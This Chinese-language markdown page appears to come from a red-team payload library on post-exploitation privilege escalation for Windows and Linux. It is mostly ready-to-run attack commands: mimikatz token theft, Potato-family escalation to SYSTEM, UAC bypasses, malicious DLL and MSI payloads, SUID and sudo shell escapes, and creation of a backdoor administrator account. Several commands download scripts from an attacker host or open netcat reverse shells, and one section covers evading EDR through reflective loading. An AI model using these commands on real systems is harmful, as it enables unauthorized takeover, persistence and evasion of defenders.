# 内网/后渗透 — 权限提升 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:UAC bypass / sudo / Linux 内核 / SUID / Windows token / SeImpersonate / Print Spooler

---

### 令牌窃取与模拟  `privilege-token`
窃取和模拟Windows访问令牌
子类：**令牌操作** · tags: `token` `privilege` `impersonation` `windows`

**前置条件：** 已获得目标机器权限；SeImpersonatePrivilege权限；Windows系统

**攻击链：**

**1. 列出令牌**  _[windows]_
_列出系统中所有可用令牌_
```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

**2. 窃取令牌**  _[windows]_
_窃取指定用户的令牌_
```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

**3. JuicyPotato攻击**  _[windows]_
_JuicyPotato提权（需要SeImpersonatePrivilege）_
```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

**4. PrintSpoofer**  _[windows]_
_PrintSpoofer提权_
```
PrintSpoofer.exe -i -c cmd
```

**5. GodPotato**  _[windows]_
_GodPotato提权，支持更多Windows版本_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**EDR 绕过变体：**

**1. RoguePotato**
_RoguePotato，绕过更多限制_
```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```

**分析：** 令牌窃取成功后可以模拟高权限用户身份执行操作。

**OPSEC：** Potato系列工具利用DCOM机制；需要SeImpersonatePrivilege权限；不同Windows版本需要不同的CLSID

---

### Windows权限提升  `windows-privesc`
Windows系统提权技术
子类：**Windows** · tags: `privesc` `windows` `privilege`

**前置条件：** 普通用户权限；系统漏洞

**攻击链：**

**1. 检查提权向量**  _[windows]_
_检查当前权限_
```
whoami /priv
whoami /groups
```

**2. 使用WinPEAS**  _[windows]_
_自动化提权检查_
```
winpeas.exe
```

**3. 检查服务权限**  _[windows]_
_检查可写服务_
```
accesschk.exe -uwcqv "Everyone" *
```

**4. 检查未引用服务路径**  _[windows]_
_查找未引用服务路径_
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```

---

### Linux权限提升  `linux-privesc`
Linux系统提权技术
子类：**Linux** · tags: `privesc` `linux` `privilege`

**前置条件：** 普通用户权限；系统漏洞

**攻击链：**

**1. 检查SUID**  _[linux]_
_查找SUID文件_
```
find / -perm -4000 -type f 2>/dev/null
```

**2. 检查Sudo**  _[linux]_
_检查sudo权限_
```
sudo -l
```

**3. 检查Cron**  _[linux]_
_检查计划任务_
```
cat /etc/crontab
ls -la /etc/cron*
```

**4. 使用LinPEAS**  _[linux]_
_自动化提权检查_
```
linpeas.sh
```

---

### UAC绕过  `uac-bypass`
绕过Windows用户账户控制
子类：**UAC** · tags: `uac` `bypass` `windows`

**前置条件：** 管理员组成员；UAC启用

**攻击链：**

**1. Fodhelper**  _[windows]_
_通过fodhelper绕过UAC_
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

**2. Eventvwr**  _[windows]_
_通过eventvwr绕过UAC_
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

**3. 使用UACME**  _[windows]_
_使用UACME工具_
```
Akagi64.exe 23 cmd.exe
```

---

### DLL劫持  `dll-hijack`
通过DLL劫持提权
子类：**DLL** · tags: `dll` `hijack` `privesc`

**前置条件：** 可写目录；DLL搜索顺序

**攻击链：**

**1. 查找DLL劫持**  _[windows]_
_监控进程加载的DLL_
```
使用Procmon监控DLL加载
```

**2. 创建恶意DLL**  _[linux]_
_生成恶意DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**3. 放置DLL**  _[windows]_
_放置DLL到目标位置_
```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```

---

### 服务提权  `service-exploit`
通过服务漏洞提权
子类：**服务** · tags: `service` `privesc` `windows`

**前置条件：** 服务修改权限；可写服务路径

**攻击链：**

**1. 检查服务权限**  _[windows]_
_检查用户可修改的服务_
```
accesschk.exe -uwcqv "Users" *
```

**2. 修改服务路径**  _[windows]_
_修改服务执行路径_
```
sc config VulnerableService binPath= "cmd /c whoami"
```

**3. 重启服务**  _[windows]_
_重启服务执行命令_
```
sc stop VulnerableService
sc start VulnerableService
```

---

### AlwaysInstallElevated提权  `always-install`
利用AlwaysInstallElevated提权
子类：**MSI** · tags: `msi` `alwaysinstall` `privesc`

**前置条件：** AlwaysInstallElevated启用

**攻击链：**

**1. 检查设置**  _[windows]_
_检查是否启用_
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**2. 创建MSI**  _[linux]_
_生成恶意MSI_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

**3. 安装MSI**  _[windows]_
_安装MSI执行代码_
```
msiexec /quiet /qn /i evil.msi
```

---

### Juicy Potato提权  `juicy-potato`
利用COM对象和SeImpersonatePrivilege提权
子类：**Potato** · tags: `juicy-potato` `com` `privesc`

**前置条件：** SeImpersonatePrivilege；Windows < 2019

**攻击链：**

**1. 检查权限**  _[windows]_
_检查SeImpersonatePrivilege_
```
whoami /priv | findstr SeImpersonate
```

**2. 执行JuicyPotato**  _[windows]_
_使用JuicyPotato提权_
```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

---

### PrintSpoofer提权  `printspoofer`
利用打印机服务提权
子类：**PrintSpoofer** · tags: `printspoofer` `privesc` `windows`

**前置条件：** SeImpersonatePrivilege

**攻击链：**

**1. 执行PrintSpoofer**  _[windows]_
_使用PrintSpoofer提权_
```
PrintSpoofer.exe -i -c cmd
```

**2. 指定命令**  _[windows]_
_执行指定命令_
```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```

---

### GodPotato提权  `godpotato`
GodPotato提权工具
子类：**GodPotato** · tags: `godpotato` `privesc` `windows`

**前置条件：** SeImpersonatePrivilege

**攻击链：**

**1. 执行GodPotato**  _[windows]_
_使用GodPotato提权_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**2. 反向Shell**  _[windows]_
_执行反向Shell_
```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```

---

### SUID提权  `suid-exploit`
利用SUID文件提权
子类：**SUID** · tags: `suid` `privesc` `linux`

**前置条件：** 存在SUID文件；可利用程序

**攻击链：**

**1. 查找SUID**  _[linux]_
_查找所有SUID文件_
```
find / -perm -4000 -type f 2>/dev/null
```

**2. 常见可利用程序**  _[linux]_
_常见SUID利用方法_
```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

**3. GTFOBins**  _[linux]_
_查找程序利用方法_
```
参考GTFOBins网站查找可利用程序
```

---

### Sudo提权  `sudo-exploit`
利用Sudo配置提权
子类：**Sudo** · tags: `sudo` `privesc` `linux`

**前置条件：** Sudo权限配置不当

**攻击链：**

**1. 检查Sudo权限**  _[linux]_
_列出可执行的sudo命令_
```
sudo -l
```

**2. 常见利用**  _[linux]_
_常见sudo利用方法_
```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

**3. CVE-2021-3156**  _[linux]_
_Baron Samedit漏洞_
```
利用sudo堆溢出漏洞
```

---

### Cron提权  `cron-exploit`
利用Cron任务提权
子类：**Cron** · tags: `cron` `privesc` `linux`

**前置条件：** 可写Cron脚本；通配符注入

**攻击链：**

**1. 检查Cron任务**  _[linux]_
_查看计划任务_
```
cat /etc/crontab
ls -la /etc/cron*
```

**2. 检查脚本权限**  _[linux]_
_检查Cron脚本权限_
```
ls -la /path/to/cron/script.sh
```

**3. 通配符注入**  _[linux]_
_利用tar通配符注入_
```
在Cron目录创建: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

---

### 内核漏洞提权  `kernel-exploit`
利用内核漏洞提权
子类：**内核** · tags: `kernel` `privesc` `exploit`

**前置条件：** 存在内核漏洞；可编译/执行exploit

**攻击链：**

**1. 检查内核版本**  _[linux]_
_查看内核版本信息_
```
uname -a
cat /proc/version
```

**2. 搜索exploit**  _[linux]_
_搜索内核exploit_
```
searchsploit kernel VERSION
```

**3. 常见内核漏洞**  _[linux]_
_常见内核提权漏洞_
```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```

---

### Potato系列提权攻击  `potato-attack`
利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM
子类：**Potato提权** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

**前置条件：** 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限；常见于IIS AppPool、SQL Server、各类服务账户

**攻击链：**

**1. 检查当前权限**  _[windows]_
_首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限_
```
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%
```

**2. JuicyPotato (Windows Server 2016/2019)**  _[windows]_
_JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令_
```
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```

**3. PrintSpoofer (Windows 10/Server 2019+)**  _[windows]_
_PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows_
```
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe
```

**4. Sweet Potato (多技术集成)**  _[windows]_
_SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式_
```
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```

**5. GodPotato (全版本通杀)**  _[windows]_
_GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种_
```
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

**6. RoguePotato (远程场景)**  _[windows]_
_RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继_
```
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```

**7. Potato选型决策流程**  _[windows]_
_根据目标系统版本选择合适的Potato变种工具_
```
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
```

**EDR 绕过变体：**

**1. 绕过EDR检测的Potato技巧**  _[windows]_
_通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测_
```
# 1. 重命名二进制文件
ren GodPotato.exe svcutil.exe

# 2. 使用.NET反射加载(无文件落地)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. 使用SharpToken替代(较新工具,签名较少)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```

**分析：** Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。

**OPSEC：** 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`11-lateral.md`](11-lateral.md) · 下一篇:[`13-evasion.md`](13-evasion.md)
